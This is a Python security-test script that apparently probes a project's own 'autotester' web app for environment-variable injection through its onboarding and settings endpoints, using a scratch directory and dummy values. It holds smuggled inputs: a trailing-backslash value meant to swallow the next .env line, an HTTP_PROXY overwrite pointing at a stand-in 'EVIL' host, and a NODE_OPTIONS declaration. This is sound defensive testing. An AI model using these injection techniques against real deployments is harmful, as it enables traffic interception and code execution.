"""Seat B r1 attack on the env-key class (T-204). Dummy values only, scratch root, names only printed.
usage: python envkey_attack.py <scratch_dir>
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

scratch = Path(sys.argv[1]).resolve()
scratch.mkdir(parents=True, exist_ok=True)
root = scratch / "root"
root.mkdir(exist_ok=True)
os.environ["AUTOTESTER_ROOT"] = str(root)
os.environ["AUTOTESTER_AUTH_DIR"] = str(scratch / "auth")
os.environ["AUTOTESTER_TEST_NO_AUTO_LOGIN"] = "1"
os.environ["AUTOTESTER_ALLOWED_HOSTS"] = "testserver"
for n in ("AUTOTESTER_AUTH_DISABLED", "AUTOTESTER_HOSTED", "AUTOTESTER_FIRST_ADMIN_EMAIL",
          "AUTOTESTER_COOKIE_SECURE", "AUTOTESTER_ALLOWED_ORIGINS", "PYTEST_CURRENT_TEST"):
    os.environ.pop(n, None)
_KEEP = {"SYSTEMROOT", "SYSTEMDRIVE", "PATH", "PATHEXT", "TEMP", "TMP", "USERPROFILE", "HOMEDRIVE",
         "HOMEPATH", "LOCALAPPDATA", "APPDATA", "COMSPEC", "WINDIR", "PROGRAMDATA", "PROGRAMFILES",
         "PYTHONIOENCODING", "PYTHONDONTWRITEBYTECODE", "USERNAME", "COMPUTERNAME", "OS", "PROCESSOR_ARCHITECTURE"}
for _k in list(os.environ):  # a clean server-like environment: only what a service would hold
    if _k not in _KEEP and not _k.startswith("AUTOTESTER_"):
        del os.environ[_k]
print("process env keys left:", sorted(os.environ))
WT = Path("D:/autoTesting/.worktrees/t204-team-login")
sys.path.insert(0, str(WT / "tests"))
sys.path.insert(0, str(WT / "src"))

from auth_harness import team  # noqa: E402

from autotester.auth.ratelimit import login_limiter, signup_limiter  # noqa: E402

login_limiter.reset()
signup_limiter.reset()
clients = team()
dev, admin = clients["dev"], clients["admin"]
ENV = root / ".env"
RESULTS: list[dict] = []


def env_keys() -> list[str]:
    from dotenv import dotenv_values
    return sorted(k for k in dotenv_values(ENV) if k) if ENV.exists() else []


def restart(extra_env: dict | None = None) -> list[str]:
    """Fresh subprocess: names of os.environ keys that load_repo_env ADDED or CHANGED."""
    code = (
        "import os,json,sys\n"
        "sys.path.insert(0, r'%s')\n"
        "os.environ.pop('PYTEST_CURRENT_TEST', None)\n"
        "before=dict(os.environ)\n"
        "from autotester.core.env import load_repo_env\n"
        "load_repo_env()\n"
        "print(json.dumps(sorted(k for k,v in os.environ.items() if before.get(k)!=v)))\n"
    ) % (WT / "src")
    env = {k: v for k, v in os.environ.items() if k not in ("PYTEST_CURRENT_TEST",)}
    env["AUTOTESTER_ROOT"] = str(root)
    env.update(extra_env or {})
    out = subprocess.run([sys.executable, "-c", code], env=env, capture_output=True, text=True,
                         cwd=str(scratch))
    if out.returncode:
        return ["<<load_repo_env crashed: " + out.stderr[-200:] + ">>"]
    return json.loads(out.stdout.strip().splitlines()[-1])


def onboard(slug: str, key: str, value: str = "EVIL") -> int:
    return dev.post("/onboard", data={
        "slug": slug, "name": slug.title() or "x", "base_url": f"https://{slug}.test",
        "allowed_domains": f"{slug}.test", "credential_key": key, "credential_value": value,
        "credential_domains": f"{slug}.test", "credential_description": ""}).status_code


def rec(case: str, outcome: str, exported_bad: list[str]) -> None:
    RESULTS.append({"case": case, "outcome": outcome, "exported_unexpected": exported_bad})
    print(f"{case:55s} {outcome:30s} unexpected_exported={exported_bad}")



ENV.write_text("AUTOTESTER_APPROVAL_KEY=dummy-approval\nHTTP_PROXY=http://op-proxy:3128\n", encoding="utf-8")


def restart_vals():
    code = ("import os,json,sys\nsys.path.insert(0, r'%s')\nos.environ.pop('PYTEST_CURRENT_TEST', None)\n"
            "from autotester.core.env import load_repo_env\nbefore=dict(os.environ)\nload_repo_env()\n"
            "print(json.dumps({k:('changed' if v!=before.get(k) else 'same') for k,v in os.environ.items() "
            "if k in ('HTTP_PROXY','ANTHROPIC_API_KEY','AUTOTESTER_APPROVAL_KEY')}))\n") % (WT / "src")
    env = dict(os.environ)
    env["AUTOTESTER_ROOT"] = str(root)
    o = subprocess.run([sys.executable, "-c", code], env=env, capture_output=True, text=True, cwd=str(scratch))
    return o.stdout.strip().splitlines()[-1] if o.stdout.strip() else o.stderr[-300:]


from dotenv import dotenv_values  # noqa: E402

# E2 swallow: dev backslash value, then admin writes the provider key after it
print("E2 onboard bsx:", onboard("bsx", "BSX_K", "x\\"))
print("E2 admin sets provider key:", admin.post("/settings/providers", data={"key": "ANTHROPIC_API_KEY", "value": "sk-dummy-after"}).status_code)
print("E2 dotenv sees ANTHROPIC_API_KEY?", "ANTHROPIC_API_KEY" in dotenv_values(ENV), sorted(dotenv_values(ENV)))
print("E2 restart ->", restart_vals())
# E3 legacy declared HTTP_PROXY: dev overwrites operator value, undeclares, restart
lp = root / "projects" / "legacy"
lp.mkdir(parents=True, exist_ok=True)
(lp / "project.json").write_text(json.dumps({"slug": "legacy", "name": "Legacy", "base_url": "https://legacy.test",
    "allowed_domains": ["legacy.test"], "secrets": [{"key": "HTTP_PROXY", "domains": ["legacy.test"]}]}), encoding="utf-8")
from autotester.auth.access import set_owner  # noqa: E402
from autotester.auth.accounts import list_users  # noqa: E402

set_owner("legacy", next(u.id for u in list_users() if u.email == "dev@team.test"))
print("E3 dev sets legacy-declared HTTP_PROXY:", dev.post("/projects/legacy/env", data={"key": "HTTP_PROXY", "value": "http://EVIL:1"}).status_code,
      "restart ->", restart_vals())
print("E3 dev undeclares:", dev.post("/projects/legacy/secrets/HTTP_PROXY/delete").status_code, "restart ->", restart_vals())
print("E4 declare out-of-namespace on legacy via /secrets:", dev.post("/projects/legacy/secrets", data={"key": "NODE_OPTIONS", "domains": "legacy.test"}).status_code)
